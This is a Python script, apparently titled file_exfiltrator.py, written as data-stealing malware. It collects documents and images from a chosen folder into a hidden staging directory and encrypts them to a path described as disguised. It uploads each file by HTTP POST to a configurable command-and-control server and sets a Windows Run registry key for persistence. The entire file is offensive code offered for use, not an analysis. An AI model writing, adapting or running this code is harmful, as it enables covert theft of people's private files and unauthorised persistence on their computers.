import os
import shutil
import requests
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import winreg as reg

# === CONFIGURATION ===
TARGET_EXTENSIONS = ('.txt', '.docx', '.jpg')  # You can add more extensions
SOURCE_DIR = input("Enter the folder to search: ")  # User specifies source folder
STAGING_DIR = os.path.join(os.environ['USERPROFILE'], 'Desktop', '.staging_copy')  # Folder to copy files to
LOG_FILE = os.path.join(os.environ['USERPROFILE'], 'Documents', 'files.log')  # Log file to record paths of copied files
ENCRYPTED_OUTPUT = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'files.log')  # disguised as a file
KEY_FILE = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'key.bin')
RESTORED_FOLDER = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'restored_staging_copy')  # Folder to restore files
PERSISTENCE_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
SCRIPT_PATH = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'file_exfiltrator.py')
C2_SERVER = 'http://localhost:8080'  # Change to your C2 server URL

# ==========================
# 1. File Collection
# ==========================
def collect_files(source_dir, target_dir):
    """Collect files from source_dir matching TARGET_EXTENSIONS and copy them to target_dir."""
    if not os.path.exists(source_dir):
        print(f"[!] Source folder '{source_dir}' does not exist. Aborting.")
        return
    
    if os.path.exists(target_dir):
        shutil.rmtree(target_dir)  # Clean up previous staging directory
    os.makedirs(target_dir)  # Create the new staging directory

    results = []  # To store file paths to log

    for root, _, files in os.walk(source_dir):
        for file in files:
            if file.lower().endswith(TARGET_EXTENSIONS):
                full_path = os.path.join(root, file)
                rel_path = os.path.relpath(full_path, source_dir)  # Preserve folder structure
                dest_path = os.path.join(target_dir, rel_path)

                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                shutil.copy2(full_path, dest_path)  # Copy the file to the new location
                results.append(dest_path)  # Add the copied file path to results
                print(f"[+] Copied: {full_path} -> {dest_path}")
    
    # Log the results to files.log in Documents folder
    log_results(results)

def log_results(results):
    """Log the file paths of copied files to 'files.log'."""
    with open(LOG_FILE, 'w') as log_file:
        for result in results:
            log_file.write(result + '\n')
    print(f"[+] Results logged to {LOG_FILE}")

# ==========================
# 2. Encryption
# ==========================
def generate_key():
    key = get_random_bytes(32)  # AES-256
    with open(KEY_FILE, 'wb') as f:
        f.write(key)
    print(f"[+] AES key saved to: {KEY_FILE}")
    return key

def encrypt_file(file_path, key, output_dir):
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

    # Build encrypted file path
    rel_path = os.path.relpath(file_path, STAGING_DIR)
    encrypted_path = os.path.join(output_dir, rel_path)

    os.makedirs(os.path.dirname(encrypted_path), exist_ok=True)
    with open(encrypted_path, 'wb') as f:
        f.write(iv + ciphertext)

    print(f"[+] Encrypted: {file_path} -> {encrypted_path}")

def encrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            full_path = os.path.join(root, file)
            encrypt_file(full_path, key, ENCRYPTED_OUTPUT)

# ==========================
# 3. Exfiltration
# ==========================
def send_files_to_c2():
    z = []
    for r, d, f in os.walk(ENCRYPTED_OUTPUT):
        for i in f:
            z.append(os.path.join(r, i))
    
    for p in z:
        with open(p, 'rb') as f:
            data = {'file': (os.path.basename(p), f)}
            try:
                r = requests.post(C2_SERVER, files=data)
                if r.status_code == 200:
                    print(f"[+] Sent: {p}")
                else:
                    print(f"[!] Failed: {p}")
            except Exception as e:
                print(f"[!] Error sending {p}: {e}")

# ==========================
# 4. Persistence (Optional)
# ==========================
def add_persistence():
    key = reg.HKEY_CURRENT_USER
    reg_key = reg.OpenKey(key, PERSISTENCE_KEY, 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(reg_key, "FileExfiltrator", 0, reg.REG_SZ, SCRIPT_PATH)
    reg.CloseKey(reg_key)
    print(f"[+] Persistence added to registry: {SCRIPT_PATH}")

# ==========================
# 5. Decryption
# ==========================
def decrypt_file(file_path, key):
    print(f"[+] Processing file: {file_path}")
    
    # Open the encrypted file and read the IV + ciphertext
    with open(file_path, 'rb') as f:
        iv = f.read(16)  # First 16 bytes are the IV (Initialization Vector)
        ciphertext = f.read()  # The rest is the encrypted data

    # Create AES cipher object
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Decrypt the data and remove padding
    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)

    # Determine the path for the restored file (preserving folder structure)
    rel_path = os.path.relpath(file_path, ENCRYPTED_OUTPUT)
    restored_file_path = os.path.join(RESTORED_FOLDER, rel_path)

    # Ensure the directory structure exists for the restored file
    os.makedirs(os.path.dirname(restored_file_path), exist_ok=True)

    # Write the decrypted content to the restored folder
    with open(restored_file_path, 'wb') as f:
        f.write(decrypted_data)

    print(f"[+] Decrypted and restored: {restored_file_path}")

def decrypt_folder(encrypted_folder, key):
    print(f"[+] Scanning folder: {encrypted_folder}")
    
    for root, dirs, files in os.walk(encrypted_folder):
        for file in files:
            encrypted_file_path = os.path.join(root, file)
            print(f"[+] Found file: {encrypted_file_path}")  # Debugging: show each file found
            decrypt_file(encrypted_file_path, key)

# ==========================
# Main Execution Flow
# ==========================
def main():
    # Step 1: Collect files
    print("[+] Collecting files...")
    collect_files(SOURCE_DIR, STAGING_DIR)
    
    # Step 2: Encrypt collected files
    print("[+] Encrypting files...")
    key = generate_key()
    encrypt_folder(STAGING_DIR, key)
    
    # Step 3: Exfiltrate encrypted files to C2
    print("[+] Exfiltrating files...")
    send_files_to_c2()
    
    # Step 4: (Optional) Add persistence
    add_persistence()
    
    # Step 5: Decrypt files if needed
    # Uncomment this part when you want to decrypt files
    # print("[+] Decrypting files...")
    # decrypt_folder(ENCRYPTED_OUTPUT, key)

if __name__ == "__main__":
    main()
